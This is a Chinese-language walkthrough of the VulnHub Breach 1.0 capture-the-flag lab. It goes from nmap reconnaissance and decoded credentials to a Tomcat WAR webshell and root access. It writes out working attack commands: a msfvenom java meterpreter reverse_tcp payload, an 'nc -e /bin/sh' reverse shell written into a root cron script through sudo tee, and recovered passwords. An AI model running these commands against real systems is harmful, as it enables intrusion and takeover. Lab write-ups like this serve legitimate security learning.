breach-1152

环境信息

靶机下载地址：https://www.vulnhub.com/entry/breach-1,152/

kali攻击机：192.168.110.128

Breach靶机：192.168.110.140 该靶机设置了静态IP，需要将虚拟网段改成192.168.110.0/24

渗透测试

信息收集

主机存活识别

在kali上使用namp进行主机发现

nmap -sP 192.168.110.0/24

发现除该网段下除kali本机和网关IP外，存在192.168.110.140主机，即为靶机IP

端口扫描

对192.168.110.140主机进行端口和服务扫描

nmap -v -A -T4 192.168.110.140

信息发现

访问http://192.168.110.140/

对靶机背景简单描述了下，查看一下网页源代码，发现存在一串加密字符串

猜测是base64加密，使用工具进行解密

经过两次解密后得出以下信息，似乎是登陆用户名密码

pgibbons:damnitfeel$goodtobeagang$ta

同时发现点击页面中的图片会跳转超链接http://192.168.110.140/initech.html

点击超链接跳转到Penetrode Cyber Consulting, LLP主页

依次点击左侧大纲，前三个连接到图片，第四个连接到一个php页面

点击超链接，跳转到一个impresscms

页面中存在一个用户登陆的功能，使用上面解密出的用户名密码尝试登陆

发现成功登陆

先看看该cms上面有什么线索

发现收件箱里有3个邮件

发现keystore文件

在第三封邮件中发现在http://192.168.110.140/.keystore保存了一个keystore文件，访问即下载

发现攻击流量pcap文件

继续发现其他线索，在该content区域发现一个邮件

通过描述得知http://192.168.110.140/impresscms/_SSL_test_phase1.pcap是攻击时的抓包文件，同时有一句话说alias name、storepassword 和keypassword 都设置为tomcat

访问http://192.168.110.140/impresscms/_SSL_test_phase1.pcap即下载pcap文件

打开pcap文件，发现流量是加密数据

解密pcap文件

推断需要使用keystore文件对pcap文件进行解密。经查询keystore文件是一种用于存储证书和私钥的文件格式，可以使用kali的keytool进行查看证书信息。

keytool -v -list -keystore keystore
#口令是tomcat

从密钥库导出p12证书

keytool -importkeystore -srckeystore ./keystore -destkeystore ./tomcatkeystore.p12 -deststoretype PKCS12 -srcalias tomcat

将p12证书导入wireshark

打开pcap文件，在编辑-首选项-Protocols-TLS中，点击Edit RSA key list

添加一项，再点击Ok

再次查看流量已经是解密流量了

登陆tomcat后台

通过流量发现再对https://192.168.110.140:8443/_M@nag3Me/html进行访问，通过浏览器对该地址访问发现无法直接访问，推断是浏览器认为不安全，需要证书，此时可利用burpsuite的证书做代理

成功访问后发现需要登陆认证，继续从pcap中寻找认证信息

从第一个请求中可知未认证授权访问返回401，第二个请求访问返回200，推断第二个请求中携带了认证信息，查看第二个请求包

可知使用了http basic基础认证，使用base64进行解密，获得以下信息

tomcat:Tt\\5D8F(#!*u=G)4m7zB

使用该登陆信息登陆https://192.168.110.140:8443/_M@nag3Me/html

成功登陆后台，是tomcat应用

tomcat后台getshell

通过tomcat页面可进行部署应用，此时可以上传webshell来getshell

kali开启反弹shell监听

msfconsole
use exploit/multi/handler
set payload java/meterpreter/reverse_tcp
set LHOST 192.168.110.128
run

使用kali生成反弹shell的war包

msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.110.128 LPORT=4444 -f war > webshell.war

上传该war包至tomcat部署

此时发现在tomcat的应用目录下多了/webshell目录

点击该目录以触发webshell

此时查看kali接收到shell

权限提升

为了使shell的执行有回显，开启伪终端

python -c 'import pty;pty.spawn("/bin/bash")'

查看passwd文件，重点关注用户id未1000以后且未/bin/bash可登陆用户

可见两个引起注意的用户：milton和blumbergh

提权到milton用户

进一步发现服务器上安装了mysql，此时思路是获取mysql的登陆密码，从而查询用户的登陆信息

进入到网站目录/var/www/ 发现一个5446目录，进入查看存在特殊文件名文件

查看文件可知该文件存储了mysql的root用户登陆信息，密码为空。接下来尝试登陆mysql，执行netstat -nlpt|grep 3306可知mysql监听地址为127.0.0.1仅本地访问，所以只能再本地查询mysql

mysql -u root -p
use mysql;
select user,password from user;
exit

发现一个和milton用户相关的信息

milton  6450d89bd3aff1d893b85d3ad65d2ec2

对该值进行md5解密，获得

thelaststraw

切换到milton用户

su - milton

发现该用户没有sudo权限

提权到blumbergh用户

查看milton用户的历史命令

发现有登陆过blumbergh用户的记录，结合/etc/passwd下的用户描述，跟Bill有关，之前网站上就有出现过这个Bill这个名字

并且在网站根目录/var/www/html/下还发现了images，里面也有bill相关的图片bill.png

图片提示需要查看源码，此时可以用strings命令将图片中的可打印字符输出到文本中查看

strings bill.png >> info.txt
cat info.txt

出现一个完整的单词，推测是blumbergh用户的密码

coffeestains

使用该密码登陆blumbergh用户，成功登陆到blumbergh用户

su - blumbergh

提权到root用户

查看blumbergh用户的sudo权限

发现blumbergh用户可以以root用户身份免密执行/usr/bin/tee /usr/share/cleanup/tidyup.sh

查看/usr/share/cleanup/tidyup.sh文件的内容

根据描述信息可知该脚本每3分钟会执行一次为了防止黑客，执行的命令是将tomcat的应用进行删除，这就解释了为什么war包上传后隔一段时间就找不到

此处可利用tee命令将反弹shell命令写入到/usr/share/cleanup/tidyup.sh脚本中

先在kali上开启端口监听

nc -lvp 7777


echo "nc -e /bin/sh 192.168.110.128 7777 0>&1" >> shell.txt
cat shell.txt| sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh

成功将反弹shell命令写入tidyup.sh脚本，等待定时任务的执行

等待一段时间后，7777端口成功接收到shell

技术总结

利用python导入反弹shell的终端：python -c ‘import pty;pty.spawn(“/bin/bash”)’

将keystore文件转换成tls证书解密https流量

利用tomcat特性使用war生成webshell

利用tee写入反弹shell
